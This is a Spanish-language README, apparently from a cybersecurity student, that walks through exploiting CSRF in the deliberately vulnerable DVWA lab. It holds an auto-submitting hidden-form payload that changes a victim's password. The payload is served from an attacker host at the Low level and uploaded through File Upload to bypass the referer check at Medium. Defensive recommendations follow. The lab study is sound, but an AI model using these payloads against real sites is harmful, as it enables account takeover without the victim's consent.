# 🛡️ DVWA - Cross Site Request Forgery (CSRF) - Low y Medium

En este repositorio se explica cómo explotar la vulnerabilidad **CSRF (Cross Site Request Forgery)** en los niveles **Low** y **Medium** dentro de **DVWA (Damn Vulnerable Web Application)**.

---

## 🎯 Objetivo

Realizar un ataque CSRF para cambiar la contraseña de un usuario autenticado sin su consentimiento, aprovechando la ausencia o debilidad de protecciones en el formulario vulnerable.

---

## 🔧 Nivel Low

### 🧪 Vulnerabilidad detectada
- No hay validación de origen ni token CSRF.
- Es posible realizar el ataque simplemente cargando una página maliciosa en el navegador de la víctima mientras está autenticada.

### 🛠 Paso a paso

1. Crear un archivo llamado `csrf.html` con el siguiente contenido:

```html
<html>
  <body>
    <script>history.pushState('', '', '/')</script>
    <form action="http://127.0.0.1/dvwa/vulnerabilities/csrf/" method="GET">
      <input type="hidden" name="password_new" value="nuevacontra" />
      <input type="hidden" name="password_conf" value="nuevacontra" />
      <input type="hidden" name="Change" value="Change" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

2. Levantar un servidor HTTP simple:

```bash
python3 -m http.server 80
```

3. Enviar el enlace al archivo (por ejemplo `http://attacker-ip/csrf.html`) a la víctima autenticada.

4. Al visitar el enlace, la contraseña se cambiará automáticamente.

✅ **Exploit exitoso**: la contraseña cambia sin interacción del usuario.

---

## 🔧 Nivel Medium

### 🧪 Vulnerabilidad detectada
- El servidor verifica el **referer** o el origen de la petición.
- Una petición externa directa no funciona, pero se puede subir el exploit usando otra vulnerabilidad.

### 🛠 Paso a paso (CSRF + File Upload)

1. Cambiar el archivo `csrf.html` a `csrf.php`.
2. Establecer el nivel de seguridad en **Low** temporalmente.
3. Ir a la sección **File Upload** de DVWA.
4. Subir el archivo `csrf.php` al servidor.

```html
<html>
  <body>
    <script>history.pushState('', '', '/')</script>
    <form action="http://127.0.0.1/dvwa/vulnerabilities/csrf/" method="GET">
      <input type="hidden" name="password_new" value="mediumpass" />
      <input type="hidden" name="password_conf" value="mediumpass" />
      <input type="hidden" name="Change" value="Change" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

5. Una vez subido, visitar la URL del archivo, por ejemplo:

```
http://127.0.0.1/dvwa/hackable/uploads/csrf.php
```

✅ **Exploit exitoso**: al alojar el archivo en el mismo servidor, se evita el filtro del referer y se cambia la contraseña.

---

## ⚠️ Recomendaciones de seguridad

Para prevenir ataques CSRF:

- Usar tokens CSRF únicos por sesión y validados en el servidor.
- Verificar cabeceras de origen (`Origin` o `Referer`).
- No permitir cargas de archivos ejecutables.
- Aplicar SameSite en cookies.

---

## 📚 Recursos

- 🔗 [Writeup de Aftab Sama sobre CSRF](https://aftabsama.com/writeups/dvwa/cross-site-request-forgery-csrf/)
- ▶️ [Vídeo tutorial de CSRF en DVWA](https://www.youtube.com/watch?v=Nfb9E8MJv6k&list=PLHUKi1UlEgOJLPSFZaFKMoexpM6qhOb4Q&index=4)
- 📖 [OWASP - CSRF](https://owasp.org/www-community/attacks/csrf)

---

## 👨‍💻 Autor

**Carlos Peris Navarro**  
Estudiante de Ciberseguridad

